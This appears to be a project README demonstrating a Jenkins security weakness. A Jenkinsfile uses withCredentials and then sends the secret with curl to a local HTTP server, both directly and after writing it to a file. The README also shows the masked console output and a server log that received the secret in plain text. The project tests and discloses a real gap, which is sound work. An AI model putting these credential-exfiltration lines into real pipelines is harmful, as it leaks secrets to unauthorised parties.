# Test jenkins security mechanism 

This project contains some tests to confirm that:
 
 - Anyone who can modify Jenkinsfile run on Jenkins server also can get secret credentials info by some way, Ex: write to file or pass parameter to CURL then send it to another HTTP server.
- If you define a string as credential content, then any sub strings equals with this credentials content will be replaced and masked by * characters when we print them to Jenkins build console

## Prerequisite

- A Jenkins server.
- A HTTP Server run on port 8000 (example, you can create it by this command: `python -m SimpleHTTPServer`)

## Steps:
- Set a Jenkins credentials with type is `secret text`, id is `test-credential-secret-text` and content is `133331`
- Connect github with Jenkins
- Commit to Github to trigger Jenkins build
- See Jenkins build console output

## Jenkinsfile content


```groovy

node {
    stage("Checkout") {
        checkout scm
    }
    stage('Test ansible read credentials') {
        docker.image('williamyeh/ansible:centos7').inside() {
            withCredentials([string(credentialsId: 'test-credential-secret-text',
                    variable: 'secret_text')]) {
                sh "ls -al"

                echo "${secret_text}"
                sh "ansible-playbook -i jenkins_local.ini " +
                        "-e 'secret_variable=${secret_text} normal_variable=123456' " +
                        "test_security.yml"
            }
        }
    }
    stage('Send secret credentials to outside Server') {
        withCredentials([string(credentialsId: 'test-credential-secret-text',
                variable: 'secret_text')]) {
            sh "curl -X GET 'http://127.0.0.1:8000?secret_text=${secret_text}'"
        }
    }

    stage('Write secret credentials to files') {
        withCredentials([string(credentialsId: 'test-credential-secret-text',
                variable: 'secret_text')]) {
            writeFile file: "secret.txt", text: "${secret_text}"
            def fileContent = readFile file: "secret.txt"
            sh "curl -X GET 'http://127.0.0.1:8000?secret_text=${fileContent}abcdef'"
        }
    }
    stage('Print somethings equals contents') {
        withCredentials([string(credentialsId: 'test-credential-secret-text',
                variable: 'secret_text')]) {
            echo "${secret_text}"
            def secret_text2 ="133331"
            echo "${secret_text2}"
            echo "133331"
        }
    }
}

```

### Jenkins build console output


```log
[Pipeline] echo
****
[Pipeline] sh
[jenkins-security-test_master-6AZFAWRWEHCIEDMHLYY666ZGCGZ4FEPGZP6VDQSIYBRPN77QDUMQ] Running shell script
+ ansible-playbook -i jenkins_local.ini -e 'secret_variable=**** normal_variable=123456' test_security.yml

PLAY [jenkins_local] ***********************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [test_security : Print secret environment variable when contains] *********
ok: [localhost] => {
    "msg": "secret variable contains 13"
}

TASK [test_security : Print secret environment variable when contains] *********
ok: [localhost] => {
    "msg": "secret variable not contains 96"
}

TASK [test_security : Print directly secret environment variable] **************
ok: [localhost] => {
    "msg": "****"
}

TASK [test_security : Print normal environment variable] ***********************
ok: [localhost] => {
    "msg": "123456"
}

PLAY RECAP *********************************************************************
localhost                  : ok=5    changed=0    unreachable=0    failed=0   

[Pipeline] }
[Pipeline] // withCredentials
[Pipeline] }
[Pipeline] stage
[Pipeline] { (Send secret credentials to outside Server)
[Pipeline] withCredentials
[Pipeline] {
[Pipeline] sh
[enkins-security-test_master-6AZFAWRWEHCIEDMHLYY666ZGCGZ4FEPGZP6VDQSIYBRPN77QDUMQ] Running shell script
+ curl -X GET http://127.0.0.1:8000?secret_text=****
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   332  100   332    0     0   106k      0 --:--:-- --:--:-- --:--:--  162k
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /?secret_text=****</title>
<body>
<h2>Directory listing for /?secret_text=****</h2>
</body>
</html>
[Pipeline] stage
[Pipeline] { (Write secret credentials to files)
[Pipeline] withCredentials
[Pipeline] {
[Pipeline] writeFile
[Pipeline] readFile
[Pipeline] sh
[enkins-security-test_master-6AZFAWRWEHCIEDMHLYY666ZGCGZ4FEPGZP6VDQSIYBRPN77QDUMQ] Running shell script
+ curl -X GET http://127.0.0.1:8000?secret_text=****abcdef
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   344  100   344    0     0   152k      0 --:--:-- --:--:-- --:--:--  335k
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /?secret_text=****abcdef</title>
<body>
<h2>Directory listing for /?secret_text=****abcdef</h2>
<hr>
</body>
</html>
[Pipeline] stage
[Pipeline] { (Print somethings equals contents)
[Pipeline] withCredentials
[Pipeline] {
[Pipeline] echo
****
[Pipeline] echo
****
[Pipeline] echo
****
[Pipeline] }
[Pipeline] // node
[Pipeline] End of Pipeline

GitHub has been notified of this commit’s build result

Finished: SUCCESS
```

### Secret info received in HTTP Server

```log
127.0.0.1 - - [03/Sep/2018 21:05:47] "GET /?secret_text=133331 HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:06:03] "GET /?secret_text=133331 HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:23:03] "GET /?secret_text=133331 HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:31:03] "GET /?secret_text=133331 HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:31:04] "GET /?secret_text=133331abcdef HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:45:31] "GET /?secret_text=133331 HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:45:32] "GET /?secret_text=133331abcdef HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:49:03] "GET /?secret_text=133331 HTTP/1.1" 200 -
127.0.0.1 - - [03/Sep/2018 21:49:03] "GET /?secret_text=133331abcdef HTTP/1.1" 200 -
```